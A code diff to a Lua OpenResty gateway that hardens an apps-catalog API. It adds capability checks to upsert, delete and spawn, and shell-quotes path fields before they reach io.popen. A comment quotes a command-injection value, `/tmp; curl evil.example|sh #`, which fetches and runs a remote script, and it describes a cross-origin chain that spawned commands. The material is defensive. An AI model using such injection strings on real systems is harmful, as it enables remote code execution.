@@ -1,4 +1,5 @@
 local cjson = require "cjson.safe"
+local operator = require "lib.operator_access"
 
 local function getNetgetDataDir()
   local env_dir = os.getenv("NETGET_DATA_DIR")
@@ -28,6 +29,21 @@ end
 local function is_local_request()
   local ip = ngx.var.remote_addr or ""
   return ip == "127.0.0.1" or ip == "::1" or ip == "unix:"
+end
+
+-- Single-quotes a string for safe interpolation into a POSIX shell command
+-- line: wraps it in '...', escaping any embedded single quote as '\''. Used
+-- for fields that are meant to be an inert PATH STRING, never shell syntax
+-- -- cwd and the internally-built log path below, NOT cmd (cmd is the one
+-- field a properly-authorized caller deliberately gets to have run as a
+-- real shell command; quoting it would defeat the whole point of the
+-- catalog). Confirmed live 2026-10-03: before this, cwd was interpolated
+-- raw via string.format("cd %s && ...", cwd, ...) -- a cwd value like
+-- `/tmp; curl evil.example|sh #` would run a second, fully independent
+-- command via the unescaped `;`, entirely separate from whatever cmd said,
+-- even once cmd's own execution is properly authorized.
+local function shell_quote(s)
+  return "'" .. tostring(s or ""):gsub("'", "'\\''") .. "'"
 end
 
 local function read_file(path)
@@ -272,9 +288,29 @@ local function list_catalog()
   return json(200, { success = true, catalog = entries, count = count })
 end
 
+-- upsert/delete/spawn are the catalog's real mutation surface -- spawn runs
+-- the entry's own cmd via io.popen, so writing an entry and spawning it is,
+-- end to end, an arbitrary-shell-command primitive. is_local_request() alone
+-- doesn't distinguish a real operator from a browser on this machine a
+-- malicious page tricked into sending the request (confirmed live
+-- 2026-10-03: a simulated cross-origin request chain, no credentials beyond
+-- being on this machine, upserted a catalog entry and spawned it for real).
+-- The location for each of these three already ran middleware/me_sig.lua in
+-- its access phase (setNginxConfigRoutes.ts's controlActionGate), so
+-- ngx.ctx.me_scopes is already populated here -- has_capability() is the
+-- actual capability decision, same model as openresty.lua's restart/stop.
+local CATALOG_CAPABILITY = {
+  upsert = "gateway:control:apps-catalog-upsert",
+  delete = "gateway:control:apps-catalog-delete",
+  spawn  = "gateway:control:apps-catalog-spawn",
+}
+
 local function upsert_catalog()
   if not is_local_request() then
     return json(403, { success = false, error = "Catalog is local-only." })
+  end
+  if not operator.has_capability(CATALOG_CAPABILITY.upsert) then
+    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.upsert })
   end
   ngx.req.read_body()
   local body = ngx.req.get_body_data()
@@ -310,6 +346,9 @@ local function delete_catalog_entry()
   if not is_local_request() then
     return json(403, { success = false, error = "Catalog is local-only." })
   end
+  if not operator.has_capability(CATALOG_CAPABILITY.delete) then
+    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.delete })
+  end
   ngx.req.read_body()
   local body = ngx.req.get_body_data()
   if not body or body == "" then
@@ -335,6 +374,9 @@ local function spawn_catalog_monad()
   if ngx.req.get_method() ~= "POST" then
     return json(405, { success = false, error = "Use POST." })
   end
+  if not operator.has_capability(CATALOG_CAPABILITY.spawn) then
+    return json(403, { success = false, error = "CAPABILITY_DENIED", required = CATALOG_CAPABILITY.spawn })
+  end
   ngx.req.read_body()
   local body = ngx.req.get_body_data()
   local req  = body and cjson.decode(body) or {}
@@ -354,7 +396,12 @@ local function spawn_catalog_monad()
   local home = os.getenv("HOME") or ""
   local cwd  = tostring(entry.cwd or home):gsub("^~", home)
   local log  = runtimeDir .. "/" .. name .. ".spawn.log"
-  local full = string.format("cd %s && %s >> %s 2>&1 &", cwd, cmd, log)
+  -- cmd is deliberately unquoted -- it is the one field a properly-
+  -- authorized caller gets to have run as a real shell command, the
+  -- catalog's whole point. cwd and log are NOT supposed to be shell syntax,
+  -- just a path each -- shell_quote() keeps them that way regardless of
+  -- content (see its own comment for the concrete cwd-breakout this closes).
+  local full = string.format("cd %s && %s >> %s 2>&1 &", shell_quote(cwd), cmd, shell_quote(log))
   local h = io.popen(full)
   if h then h:close() end
   return json(200, { success = true, name = name, message = "Spawn signal sent." })
